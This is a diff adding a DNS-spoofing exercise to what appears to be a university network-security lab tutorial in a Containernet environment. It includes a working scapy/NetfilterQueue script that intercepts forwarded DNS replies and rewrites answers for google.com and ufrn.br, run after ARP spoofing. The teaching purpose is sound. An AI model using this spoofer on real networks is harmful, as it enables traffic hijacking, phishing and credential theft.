@@ -106,6 +106,137 @@ At this point on, Chuck can even use simple tools like SSLStrip (available at /s
 
 To intercept unencrypted traffic, it's necessary to downgrade the victim's connection from HTTPS to HTTP. This is possible through SSLStrip. First, it's necessary to redirect outgoing traffic on port 80 to 8080 and then launch SSLStrip on port 8080.
 
+<a name="dns-spoofing"></a>
+# DNS Spoofing
+
+DNS spoofing, also known as DNS cache poisoning, is a cyberattack that focuses on maliciously redirecting internet traffic. In daily use, when you type a website name into your browser, the DNS system acts like a contact list that translates that name into a numerical IP address to locate the correct page. However, during an attack, the hacker manages to inject false data into the DNS server's cache or intercept your network request. Consequently, the server begins responding with an incorrect and fraudulent IP address.
+
+The main danger of this technique is that the redirection happens silently and imperceptibly to the end user. Without noticing any visual changes in the address bar, you are taken to a fake page created by the criminal, which is usually an identical copy of the original site, such as a bank login screen or a social network. The criminal's ultimate goal is almost always to steal personal data, passwords, and credit card information through phishing, or even to automatically install viruses and malware on your device.
+
+This exercise extends the previous one by adding DNS manipulation technique. To do this, please run the code below.
+
+```
+#!/usr/bin/python
+
+
+'''@author: Ramon Fontes
+   @email: ramon.fontes@imd.ufrn.br'''
+
+import os
+
+from mininet.log import setLogLevel, info
+from containernet.cli import CLI
+from containernet.net import Containernet
+
+
+def topology():
+    "Create a network."
+    DISPLAY_ID = 0
+    net = Containernet(ipBase='10.200.0.0/24')
+
+    os.system('sudo xhost +local:docker')
+    os.system('export DISPLAY=:{}'.format(DISPLAY_ID))
+
+    info("*** Creating nodes\n")
+    s1 = net.addSwitch('s1', failMode="standalone")
+    alice1 = net.addDocker('alice', dimage="ramonfontes/seguranca", cpu_shares=20,
+                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
+                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
+                           mac='00:00:00:00:00:01')
+    chuck1 = net.addDocker('chuck', dimage="ramonfontes/seguranca", cpu_shares=20,
+                           volumes=['/tmp/.X11-unix:/tmp/.X11-unix:rw'],
+                           environment={'DISPLAY':":{}".format(DISPLAY_ID)}, 
+                           mac='00:00:00:00:00:02')
+
+    net.addLink(alice1, s1)
+    net.addLink(chuck1, s1)
+
+    info("*** Starting network\n")
+    net.build()
+    net.addNAT().configDefault()
+    s1.start([])
+
+    chuck1.cmd('echo 1 > /proc/sys/net/ipv4/ip_forward')
+
+    info("*** Running CLI\n")
+    CLI(net)
+
+    info("*** Stopping network\n")
+    net.stop()
+
+
+if __name__ == '__main__':
+    setLogLevel('info')
+    topology()
+```
+
+Next, execute the ARP spoofing attack as described above, and then run the following code from Chuck's terminal.
+
+```commandline
+import os
+import logging as log
+from scapy.all import IP, DNSRR, DNS, UDP, DNSQR
+from netfilterqueue import NetfilterQueue
+
+
+class DnsSnoof:
+	def __init__(self, hostDict, queueNum):
+		self.hostDict = hostDict
+		self.queueNum = queueNum
+		self.queue = NetfilterQueue()
+
+	def __call__(self):
+		log.info("Spoofing....")
+		os.system(
+			f'iptables -I FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+		self.queue.bind(self.queueNum, self.callBack)
+		try:
+			self.queue.run()
+		except KeyboardInterrupt:
+			os.system(
+				f'iptables -D FORWARD -j NFQUEUE --queue-num {self.queueNum}')
+			log.info("[!] iptable rule flushed")
+
+	def callBack(self, packet):
+		scapyPacket = IP(packet.get_payload())
+		if scapyPacket.haslayer(DNSRR):
+			try:
+				log.info(f'[original] { scapyPacket[DNSRR].summary()}')
+				queryName = scapyPacket[DNSQR].qname
+				if queryName in self.hostDict:
+					scapyPacket[DNS].an = DNSRR(
+						rrname=queryName, rdata=self.hostDict[queryName])
+					scapyPacket[DNS].ancount = 1
+					del scapyPacket[IP].len
+					del scapyPacket[IP].chksum
+					del scapyPacket[UDP].len
+					del scapyPacket[UDP].chksum
+					log.info(f'[modified] {scapyPacket[DNSRR].summary()}')
+				else:
+					log.info(f'[not modified] { scapyPacket[DNSRR].rdata }')
+			except IndexError as error:
+				log.error(error)
+			packet.set_payload(bytes(scapyPacket))
+		return packet.accept()
+
+
+if __name__ == '__main__':
+	try:
+		hostDict = {
+			b"google.com.": "136.160.215.15",
+   			b"ufrn.br.": "136.160.215.15"
+		}
+		queueNum = 1
+		log.basicConfig(format='%(asctime)s - %(message)s',
+						level = log.INFO)
+		snoof = DnsSnoof(hostDict, queueNum)
+		snoof()
+	except OSError as error:
+		log.error(error)
+```
+
+and run the ping command from Alice to `google.com` and `ufrn.br`.
+
 <a name="passive-eavesdropping-attack"></a>
 ## Passive Eavesdropping Attack
 
